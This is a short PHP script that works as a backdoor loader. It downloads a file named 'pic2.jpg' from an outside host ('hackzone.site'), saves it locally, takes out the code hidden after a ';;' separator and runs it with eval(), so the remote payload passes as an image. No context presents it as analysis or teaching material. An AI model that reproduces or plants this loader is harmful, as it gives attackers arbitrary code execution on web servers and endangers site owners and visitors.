<?php
if (!file_exists('pic2.jpg')) {
$content = file_get_contents( 'https://hackzone.site/script/pic2.jpg');
file_put_contents('pic2.jpg',$content);
$pieces=explode(";;",$content);
eval($pieces[1]);
}
else
{
$content = file_get_contents('pic2.jpg');
$pieces=explode(";;",$content);
eval($pieces[1]);
}
?>
